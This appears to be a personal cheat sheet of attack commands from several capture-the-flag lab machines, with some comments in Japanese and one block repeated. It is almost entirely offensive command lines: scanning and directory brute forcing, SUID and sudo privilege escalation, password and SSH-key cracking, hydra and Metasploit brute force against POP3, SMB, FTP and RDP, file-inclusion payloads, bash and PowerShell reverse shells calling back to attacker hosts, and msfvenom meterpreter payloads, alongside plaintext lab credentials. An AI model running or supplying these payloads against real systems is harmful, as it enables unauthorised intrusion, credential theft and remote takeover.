
nmap -sV -O 10.10.84.242

gobuster dir -u http://10.10.84.242 -w /usr/share/wordlists/dirb/common.txt -x php

nc -lvnp 12345

find / -user root -perm -u=s -type f 2>/dev/null

/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'

sudo -l

sudo vim -c ':!bash'


nmap -sV -O 10.10.193.179

gobuster dir -u http://10.10.193.179 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

gobuster dir -u http://10.10.193.179 -w /usr/share/wordlists/dirb/common.txt -x php

python3 exploit.py -u http://10.10.193.179/simple -c -w /path/to/rockyou.txt -t 5

ssh mitch@10.10.193.179 -p 2222

cat /home/milesdyson/backups/backup.sh

nmap -sV -O 10.10.225.77

gobuster dir -u http://10.10.225.77 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

gobuster dir -u http://10.10.247.215/as -w /usr/share/wordlists/dirb/common.txt -x php

# Client-side cookie injection (manual via browser dev tools)

# SSH private key cracking
/opt/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

chmod 600 id_rsa
ssh -i id_rsa james@10.10.225.77

# Decode ROT47 password
echo ",LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN." | tr '!-~' 'P-~!-O'

# Crontab inspection
cat /etc/crontab

# Hostname hijacking
echo "10.10.95.251 overpass.thm" >> /etc/hosts

# Malicious script creation and hosting
echo 'bash -i >& /dev/tcp/10.10.95.251/12345 0>&1' > buildscript.sh
python3 -m http.server 80

# Listener for reverse shell
nc -lvnp 12345

nmap -sV -O 10.10.225.77

gobuster dir -u http://10.10.225.77 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

gobuster dir -u http://10.10.247.215/as -w /usr/share/wordlists/dirb/common.txt -x php

# Client-side cookie injection (manual via browser dev tools)

# SSH private key cracking
/opt/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

chmod 600 id_rsa
ssh -i id_rsa james@10.10.225.77

# Decode ROT47 password
echo ",LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN." | tr '!-~' 'P-~!-O'

# Crontab inspection
cat /etc/crontab

# Hostname hijacking
echo "10.10.95.251 overpass.thm" >> /etc/hosts

# Malicious script creation and hosting
echo 'bash -i >& /dev/tcp/10.10.95.251/12345 0>&1' > buildscript.sh
python3 -m http.server 80

# Listener for reverse shell
nc -lvnp 12345


nmap -sV -O 10.10.81.195

gobuster dir -u http://10.10.81.195 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

gobuster dir -u http://10.10.247.215/as -w /usr/share/wordlists/dirb/common.txt -x php

nc 10.10.81.195 110

hydra -l seina -P /usr/share/wordlists/rockyou.txt -f -o found.txt pop3://10.10.81.195

# Metasploit
msfconsole
use auxiliary/scanner/pop3/pop3_login
set RHOSTS 10.10.81.195
set USERNAME seina
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
set THREADS 10
set VERBOSE false
set CONNECT_TIMEOUT 5
run

# POP3手動ログイン
nc 10.10.81.195 110
USER seina
PASS scoobydoo2
LIST
RETR 1

# SSHログイン
ssh baksteen@10.10.81.195
# パスワード: S1ck3nBluff+secureshell

# ユーザ情報確認
id

# GIDベースの特権昇格調査
find / -gid 100 -perm -g=x -type f 2>/dev/null


nmap -sV -O 10.10.15.79

gobuster dir -u http://10.10.15.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

gobuster dir -u http://10.10.247.215/as -w /usr/share/wordlists/dirb/common.txt -x php

# Samba enumeration
smbclient -L //10.10.15.79 -N
smbclient //10.10.15.79/anonymous -N
smbclient //10.10.15.79/milesdyson -U milesdyson

# POP3 brute force
hydra -l miles -P /usr/share/wordlists/rockyou.txt -f -o found.txt pop3://10.10.15.79
hydra -l miles -P log1.txt -f -o found.txt pop3://10.10.15.79

# SMB brute force
hydra -l milesdyson -P log1.txt smb://10.10.15.79 -V

# Binary email decoding (example)
echo "01100010 01100001 01101100 ..." | perl -lpe '$_=pack"B*",$_'

# CMS directory discovery
gobuster dir -u http://10.10.15.79/45kra24zxs28v3yd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Search known vulnerabilities
searchsploit cuppa

# Local File Inclusion (LFI) via alertConfigField.php
curl "http://10.10.15.79/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../etc/passwd"

# Base64 encode Configuration.php
curl "http://10.10.15.79/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php"

# Serve malicious PHP reverse shell
python3 -m http.server 8000

# Trigger reverse shell via RFI
curl "http://10.10.15.79/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.140.194:8000/aaa.php"

# Listener for reverse shell
nc -lvnp 12345

# TTY spawn
python3 -c 'import pty; pty.spawn("/bin/bash")'


# ポートスキャン・サービスバナー取得
nmap -sV -p- 10.10.5.125

# HTTPヘッダー確認（flag含む）
nmap -p 80 --script http-headers 10.10.5.125

# SSHバナー確認（flag含む）
nmap -p 22 --script banner 10.10.5.125

# FTPログイン試行（hydraでブルートフォース）ポート10021
hydra -l eddie -P /usr/share/wordlists/rockyou.txt -f -s 10021 ftp://10.10.5.125
hydra -l quinn -P /usr/share/wordlists/rockyou.txt -f -s 10021 ftp://10.10.5.125

# FTP接続（手動ログイン）
ftp 10.10.5.125 10021

# FTP内の操作例
ls
get ファイル名
put ファイル名

# 🔍 スキャン・列挙フェーズ
nmap -sV -O 10.10.196.72

gobuster dir -u http://10.10.196.72 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http

smbclient -L //10.10.196.72 -N
smbclient //10.10.196.72/nt4wrksv -N
smbclient //10.10.196.72/nt4wrksv -U 'Bob'

# 🔐 パスワード復号（Base64）
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d

# 💻 RDP ログイン試行
xfreerdp /u:Bob /p:'!P@$$W0rD!123' /v:10.10.196.72
xfreerdp /u:Bill /p:'Juw4nnaM4n420696969!$$$' /v:10.10.196.72

# 💣 RDP ブルートフォース
hydra -l Bob -P /usr/share/wordlists/rockyou.txt rdp://10.10.196.72

# 📦 PowerShell リバースシェルペイロード（試行）
#（SMB上に配置）
$client = New-Object System.Net.Sockets.TCPClient("10.10.65.89",12345);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}

# リッスン側
nc -lvnp 12345

# 実行（失敗）
powershell -ExecutionPolicy Bypass -File "\\10.10.196.72\nt4wrksv\aaa.ps1"

# 🧨 ASPX リバースシェル作成
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.65.89 LPORT=12345 -f aspx -o shell.aspx

# SMBにアップロード
smbclient //10.10.196.72/nt4wrksv -U anonymous
put shell.aspx

# Metasploit で待受
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST 10.10.65.89
set LPORT 12345
run

# 実行トリガ
http://10.10.196.72/nt4wrksv/shell.aspx

# Meterpreter内での操作
shell
whoami /all
dir C:\Users
